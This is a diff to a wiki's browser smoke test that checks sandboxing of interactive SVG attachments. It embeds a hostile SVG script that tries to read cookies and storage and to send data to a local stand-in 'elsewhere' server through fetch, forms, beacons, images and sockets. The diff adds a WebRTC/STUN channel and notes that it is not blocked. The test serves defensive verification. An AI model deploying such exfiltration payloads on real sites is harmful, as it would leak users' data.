@@ -75,12 +75,14 @@
 //    embedded with {.interactive}, in frames the server prerenders and the
 //    program adopts without loading any again, and which the program makes
 //    itself in the editor's preview and the page after it, loading each
-//    once; a click in a flame graph's shape runs its script; a hostile SVG,
-//    in its frame and alone in a tab, finds no cookie, no storage, no way
-//    into the page, no request to the wiki or another site, no tab and no
-//    dialog, and alone in its tab can only take the tab elsewhere; one that
+//    once; a click in a flame graph's shape runs its script; a hostile SVG
+//    finds no cookie, no storage, no way into the page, no fetch to the
+//    wiki or another site, no tab and no dialog (its WebRTC connection is
+//    recorded); the same address opened in a tab is a download, whether
+//    its frame loaded first or not; another site cannot frame it; one that
 //    navigates its frame to the wiki's API arrives there signed out; the
-//    frames load with the service worker on too.
+//    frames load with the service worker on too; and over plain HTTP to a
+//    host that is not the loopback one the page shows the image instead.
 //
 // On PostgreSQL (toolchain/smoke-test.sh runs it so when one is at hand),
 // the server and the console find their database in WIKI_DATABASE_URL, which
@@ -93,6 +95,7 @@
 import assert from "node:assert/strict";
 import { execFileSync, spawn } from "node:child_process";
 import { createHash, createHmac } from "node:crypto";
+import { createSocket } from "node:dgram";
 import { createServer } from "node:http";
 import { cp, mkdtemp, readFile, rm, stat } from "node:fs/promises";
 import { tmpdir } from "node:os";
@@ -468,11 +471,9 @@ const pageAt = async (spacePath, slug) => {
 // An SVG that tries every way out of its frame and writes what happened
 // into its own text, which the test reads through Playwright's frame API,
 // since the SVG cannot tell the page. The other site is the address of a
-// server that counts what reaches it. Opened by itself in a tab with
-// &leave, it then takes its tab to the other site with what a reader might
-// have typed into it: a page may always navigate itself, and no policy
-// stops it.
-const hostileSvg = (elsewhere) => `<svg xmlns="http://www.w3.org/2000/svg" width="600" height="200" onload="tryAll()">
+// server that counts what reaches it, and the port of a UDP socket that
+// counts the STUN packets a WebRTC connection sends there.
+const hostileSvg = (elsewhere, stunPort) => `<svg xmlns="http://www.w3.org/2000/svg" width="600" height="200" onload="tryAll()">
 <script><![CDATA[
 var told = {};
 function tell(k, v) { told[k] = String(v); document.getElementById("report").textContent = JSON.stringify(told); }
@@ -496,6 +497,12 @@ function tryAll() {
     f.action = "${elsewhere}/form"; document.documentElement.appendChild(f); f.submit(); return "submitted";
   });
   attempt("beacon", function () { return navigator.sendBeacon("${elsewhere}/beacon", "x"); });
+  attempt("webrtc", function () {
+    var pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:127.0.0.1:${stunPort}" }] });
+    pc.createDataChannel("out");
+    pc.createOffer().then(function (o) { return pc.setLocalDescription(o); });
+    return "constructed";
+  });
   var img = document.createElementNS("http://www.w3.org/2000/svg", "image");
   img.setAttribute("href", "${elsewhere}/image"); document.documentElement.appendChild(img);
   var waits = [
@@ -517,10 +524,7 @@ function tryAll() {
       } catch (e) { tell("socket", "threw " + e.name); done(); }
     })
   ];
-  Promise.all(waits).then(function () {
-    tell("done", true);
-    if (!framed && location.search.indexOf("leave") >= 0) setTimeout(function () { location.href = "${elsewhere}/left?typed=" + encodeURIComponent("what the reader typed"); }, 100);
-  });
+  Promise.all(waits).then(function () { tell("done", true); });
 }
 ]]></script>
 <text id="report" x="4" y="16" font-size="10">not run</text>
@@ -548,11 +552,19 @@ const wanderSvg = `<svg xmlns="http://www.w3.org/2000/svg" onload="setTimeout(fu
 // without loading any frame again.
 async function interactiveSvgs() {
   const reached = [];
+  // Another site: what reaches it is counted, but for its page that frames
+  // the wiki's SVG, below.
+  let framingPage = "";
   const elsewhere = createServer((request, response) => {
+    if (request.url === "/framing") return response.writeHead(200, { "Content-Type": "text/html" }).end(framingPage);
     reached.push(request.url);
     response.writeHead(200, { "Content-Type": "text/plain", "Access-Control-Allow-Origin": "*" }).end("elsewhere");
   });
   const elsewhereOrigin = `http://localhost:${await listenOn(elsewhere, "localhost")}`;
+  const stunPackets = [];
+  const stun = createSocket("udp4");
+  stun.on("message", (message) => stunPackets.push(message.length));
+  const stunPort = await new Promise((ready) => stun.bind(0, "127.0.0.1", () => ready(stun.address().port)));
   try {
     const space = await api("spaces", { method: "POST", body: JSON.stringify({ parent: null, name: "Flames" }) });
     assert.equal(space.status, 201, "the space of the SVGs");
@@ -572,7 +584,7 @@ async function interactiveSvgs() {
       return response.json();
     };
     const flame = await upload("flame.svg", "image/svg+xml", flameSvg);
-    const hostile = await upload("hostile.svg", "image/svg+xml", hostileSvg(elsewhereOrigin));
+    const hostile = await upload("hostile.svg", "image/svg+xml", hostileSvg(elsewhereOrigin, stunPort));
     await upload("wander.svg", "image/svg+xml", wanderSvg);
     const framed = (a) => `/api/v1/attachments/${encodeURIComponent(a.id)}/${encodeURIComponent(a.name)}?interactive`;
 
@@ -627,6 +639,11 @@ async function interactiveSvgs() {
     assert.match(inFrame.fetchElsewhere, /^failed/, "another site, from the frame");
     assert.match(inFrame.xhr, /^(failed|threw)/, "another site by XMLHttpRequest, from the frame");
     assert.match(inFrame.socket, /^(failed|threw)/, "a WebSocket, from the frame");
+    // WebRTC is not stopped, by the sandbox or by the policy's webrtc
+    // 'block', which Chromium does not know: what the frame sent the STUN
+    // server it named is recorded, not refused (Wiki.Core.Markdown.Frame).
+    await page.waitForTimeout(1000);
+    console.log(`note: the hostile SVG's WebRTC connection: ${inFrame.webrtc}, and ${stunPackets.length} STUN packets reached the host it named`);
     assert.equal(here(page), path, "the page navigated");
     assert.deepEqual(popups, [], "a popup opened");
     assert.deepEqual(dialogs, [], "a dialog shown");
@@ -667,26 +684,26 @@ async function interactiveSvgs() {
     await page.waitForTimeout(300);
     assert.deepEqual([...loads.values()], [3, 3, 3], `the frames' loads after the editor and the page: ${JSON.stringify([...loads])}`);
 
-    // The same address opened by itself in a tab of the signed-in browser:
-    // no better off.
-    const tab = await page.context().newPage();
-    const tabDialogs = [];
-    tab.on("dialog", (dialog) => tabDialogs.push(dialog.message()));
-    await tab.goto(url(`${framed(hostile)}&leave`));
-    const alone = await reportOf(tab.mainFrame());
-    assert.equal(alone.framed, "false");
-    assert.equal(alone.origin, "null", "the tab's origin");
-    assert.equal(alone.cookie, "threw SecurityError", "the wiki's cookies, in a tab");
-    assert.equal(alone.localStorage, "threw SecurityError", "the wiki's storage, in a tab");
-    assert.equal(alone.open, "null", "another tab, from the tab");
-    assert.match(alone.fetchWiki, /^failed/, "the wiki's API, from the tab");
-    assert.match(alone.fetchElsewhere, /^failed/, "another site, from the tab");
-    assert.deepEqual(tabDialogs, [], "a dialog shown in the tab");
-    // Alone in its tab it can take the tab elsewhere, as any page can, with
-    // what its script holds: never anything of the wiki's.
-    await eventually(async () => assert.ok(tab.url().startsWith(elsewhereOrigin), tab.url()), "the tab taken elsewhere");
-    await tab.close();
+    // The same address opened by itself in a tab of the signed-in browser,
+    // just after its frames loaded: the plain answer, a download, in which
+    // nothing runs, though the browser's cache holds the frame's.
+    const opened = async (context, address) => {
+      const tab = await context.newPage();
+      const [download] = await Promise.all([tab.waitForEvent("download", { timeout }), tab.goto(url(address)).catch(() => null)]);
+      const name = download.suggestedFilename();
+      await tab.close();
+      return name;
+    };
+    assert.equal(await opened(page.context(), framed(hostile)), "hostile.svg", "the interactive address in a tab after its frame");
     await page.context().close();
+
+    // The other order, in a browser of its own: the tab first, a download,
+    // and then the page, whose frame runs the SVG all the same.
+    const tabFirst = await newPage();
+    assert.equal(await opened(tabFirst.context(), framed(flame)), "flame.svg", "the interactive address in a tab before its frame");
+    await tabFirst.goto(url(path));
+    await eventually(async () => assert.equal(await flameIn(tabFirst.locator("#app .page-view")).textContent(), "ready"), "the flame graph's frame after the tab");
+    await tabFirst.context().close();
 
     // With the service worker on, as a reader's browser has it, the frame
     // of a private space's SVG loads and runs, with the session's cookie.
@@ -700,12 +717,46 @@ async function interactiveSvgs() {
     await eventually(async () => assert.equal(await flameIn(workerPage.locator("#app .page-view")).textContent(), "ready"), "the flame graph under the service worker");
     await workerContext.close();
 
-    // Neither a frame nor the tab reached the other site but by that
-    // navigation: no request, no image, no beacon, no form, no popup.
-    assert.deepEqual(reached, [`/left?typed=${encodeURIComponent("what the reader typed")}`], "what reached another site");
-    console.log("ok: interactive SVGs of a private space run their scripts in frames the server prerenders and the program adopts without loading them again, and the island loads once each in the editor's preview and the page; they reach nothing: no cookie, no storage, no page, no request, no tab, no dialog, in a frame or alone in a tab, where they can only take the tab elsewhere; the frame loads with the service worker on too");
+    // Another site's page that frames the SVG, made public for it: its
+    // frame load asks as a frame, and the answer's frame-ancestors 'self'
+    // refuses to be shown there.
+    const madePublic = await api(`spaces/${encodeURIComponent(space.body.id)}/public`, { method: "PUT", body: JSON.stringify({ public: true }) });
+    assert.equal(madePublic.status, 200, "the space of the SVGs made public");
+    framingPage = `<iframe sandbox="allow-scripts" src="${url(framed(flame))}"></iframe>`;
+    const outsider = await browser.newPage();
+    await outsider.goto(`${elsewhereOrigin}/framing`);
+    await outsider.waitForTimeout(1000);
+    const shownElsewhere = outsider.frames().filter((f) => f !== outsider.mainFrame());
+    assert.equal(shownElsewhere.length, 1, "another site's frame");
+    // Refused by the browser, which shows its error page in its place.
+    assert.ok(shownElsewhere[0].url().startsWith("chrome-error:"), `another site's frame of the SVG: ${shownElsewhere[0].url()}`);
+    assert.notEqual(await shownElsewhere[0].evaluate(() => document.getElementById("status")?.textContent ?? null).catch(() => null), "ready", "the SVG ran in another site's frame");
+    await outsider.close();
+
+    // Over plain HTTP to a host that is not the loopback one, the page is no
+    // secure context and the browser names no frame's load to the server:
+    // the program shows the image in the frame's place (a repair of the
+    // page the server prerendered with the frame).
+    const insecure = await chromium.launch({ args: [`--host-resolver-rules=MAP wiki.example.test ${new URL(origin).hostname}`] });
+    try {
+      const reader = await insecure.newPage();
+      reader.on("pageerror", (error) => failures.push(`page error at ${reader.url()}: ${error.message}`));
+      await reader.goto(`http://wiki.example.test:${new URL(origin).port}${path}`);
+      assert.equal(await reader.evaluate(() => window.isSecureContext), false, "a page over plain HTTP to another host");
+      await eventually(async () => assert.ok(await programStarted(reader), "no listener yet"), "the program starting over plain HTTP");
+      await reader.locator("#app .page-body img[alt='Where the time goes']").waitFor({ timeout });
+      assert.equal(await reader.locator("#app .page-body iframe.wiki-svg").count(), 0, "a frame over plain HTTP");
+    } finally {
+      await insecure.close();
+    }
+
+    // No frame reached the other site: no request, no image, no beacon,
+    // no form, no popup, no navigation.
+    assert.deepEqual(reached, [], "what reached another site");
+    console.log("ok: interactive SVGs of a private space run their scripts in frames the server prerenders and the program adopts without loading them again, and the island loads once each in the editor's preview and the page; they reach no cookie, no storage, no page, no fetch, no tab and no dialog; the same address in a tab is a download, before or after its frame; another site cannot frame it; the frame loads with the service worker on too, and over plain HTTP to another host the page shows the image");
   } finally {
     elsewhere.close();
+    stun.close();
   }
 }
 
